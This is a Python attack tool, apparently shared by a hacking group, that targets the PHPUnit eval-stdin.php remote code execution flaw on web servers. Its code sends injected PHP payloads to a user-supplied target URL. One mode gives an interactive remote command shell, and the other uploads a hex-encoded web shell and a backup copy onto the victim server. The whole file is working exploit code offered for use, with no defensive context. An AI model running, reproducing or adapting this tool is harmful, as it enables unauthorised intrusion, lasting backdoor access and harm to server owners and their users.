import requests, platform, time, re, sys, os

def banner():
    print('''
 ____  _   _ ____  _   _ _   _ ___ _____ 
|  _ \| | | |  _ \| | | | \ | |_ _|_   _|
| |_) | |_| | |_) | | | |  \| || |  | |  
|  __/|  _  |  __/| |_| | |\  || |  | |  
|_|   |_| |_|_|    \___/|_| \_|___| |_|  
                                         
██████╗  ██████╗███████╗
██╔══██╗██╔════╝██╔════╝
██████╔╝██║     █████╗  
██╔══██╗██║     ██╔══╝  
██║  ██║╚██████╗███████╗
╚═╝  ╚═╝ ╚═════╝╚══════╝
By: NuLz | Haxorstars
''')
    
def clear():
    try:
        system_info = platform.system()
        if system_info == "Windows":
            time.sleep(1)
            os.system("cls")
            time.sleep(1)
        elif system_info == "Linux":
            time.sleep(1)
            os.system("clear")
            time.sleep(1)
        else:
            print("Terjadi Kesalahan.")
    except Exception as e:
        print("Terjadi Kesalahan.", e)

def typing(words):
    for char in words:
        time.sleep(0.1)
        sys.stdout.write(char)
        sys.stdout.flush()

def NuLzCMD(target):
    while True:
        input_cmd = input('CMD ~$: ')
        cmd = input_cmd.lower()
        if cmd == 'exit' or cmd == 'keluar':
            print('Anda Keluar!')
            break

        payload = "<?php if (function_exists('proc_open')) { $p = proc_open('"+cmd+"', [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']],$pipes); if(is_resource($p)){fwrite($pipes[0],'input_data_here');fclose($pipes[0]);$o=stream_get_contents($pipes[1]);fclose($pipes[1]);$e=stream_get_contents($pipes[2]);fclose($pipes[2]);$r=proc_close($p);echo $o;}}elseif(function_exists('popen')){$h=popen('"+cmd+"','r');$c=fread($h,2096);echo$c;pclose($h);}elseif(function_exists('exec')){exec('"+cmd+"',$o,$r);if($r===0){$res=implode($o);echo$res;ob_flush();flush();}}elseif(function_exists('system')){system('"+cmd+"');}elseif(function_exists('passthru')){passthru('"+cmd+"');}elseif(function_exists('shell_exec')){shell_exec('"+cmd+"');}else{echo'Not Vuln!';}?>"
        req = requests.get(target, data=payload)
        res = req.text
        print(res)

def NuLzUPSHELL(target):
    url = target
    pattern = re.compile(r'PHP/([^/]+)')
    match = pattern.search(url)
    if match:
        shell_url = pattern.sub(r'PHP/nulz.php', url)
        backup_url = pattern.sub(r'PHP/nulz-backup.php', url)
    else:
        print("Terjadi Kesalahan, Mohon Periksa URL Target Anda.")

    print("Your Shell Path In Your Device! Example: /documents/myshell/shell.php")
    inputshell = input("Shell Path >: ")
    getshell = open(inputshell, 'r').read()
    shellcontent = getshell.encode().hex()
    print("Shell Name To Upload! Example: nulz.php")
    shellname = input("Upload Shell Name >: ")
    print("Shell Name To Backup Upload! Example: nulz-backup.php")
    shellbackup = input("Backup Shell Name >: ")
    if match:
        shell_url = pattern.sub(r'PHP/{}.php'.format(shellname), url)
        backup_url = pattern.sub(r'PHP/{}.php'.format(shellbackup), url)
    else:
        print("Terjadi Kesalahan, Mohon Periksa URL Target Anda.")

    typing('Exploiting The Target...\n')
    payload = "<?php $upshell=file_put_contents('"+shellname+"',hex2bin('"+shellcontent+"'));if($upshell){echo 'Upload Shell Success, shell name => "+shellname+"'.PHP_EOL;echo '"+shell_url+"';}else{echo 'Upload Shell Failed :(';}echo PHP_EOL;$getshell=fopen('"+shellbackup+"','w');$backupshell=fwrite($getshell,hex2bin('"+shellcontent+"'));if($backupshell){fclose($getshell);echo 'Backup Shell Success, backup name => "+shellbackup+"'.PHP_EOL;echo '"+backup_url+"';}else{fclose($getshell);echo 'Upload Shell Failed :(';} ?>"
    req = requests.get(target, data=payload)
    res = req.text
    print(res)

def NuLzGG():
    clear()
    banner()
    while True:
        try:
            print('Target Example: https://domain.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
            target = input('TARGET >: ')
            print('''
[ Select Option ]
--------------------------
[1] RCE (Command)
[2] UPSHELL (Upload Shell in Current Dir)
--------------------------
        ''')
            select_payload = input("Select >: ")
            if select_payload:
                try:
                    selected_payload = int(select_payload)
                    if selected_payload == 1:
                        NuLzCMD(target)
                    elif selected_payload == 2:
                        NuLzUPSHELL(target)
                        quest = input('\nApakah anda ingin keluar? Y/N >: ')
                        if quest:
                            if quest == 'y' or quest == 'Y':
                                print('Anda Keluar!')
                                exit()
                            elif quest == 'n' or quest == 'N':
                                continue
                            else:
                                print('Mohon Masukan Pilihan Dengan Benar')
                        else:
                            print('Mohon Masukan Pilihan Dengan Benar')
                except ValueError:
                    print('Mohon Masukan Pilihan Dengan Benar')
            else:
                print('Mohon Masukan Pilihan Dengan Benar')
        except KeyboardInterrupt:
            quest = input('\nApakah anda ingin keluar? Y/N >: ')
            if quest:
                if quest == 'y' or quest == 'Y':
                    print('Anda Keluar!')
                    exit()
                elif quest == 'n' or quest == 'N':
                    continue
                else:
                    print('Mohon Masukan Pilihan Dengan Benar')
            else:
                print('Mohon Masukan Pilihan Dengan Benar')

if __name__ == '__main__':
    NuLzGG()
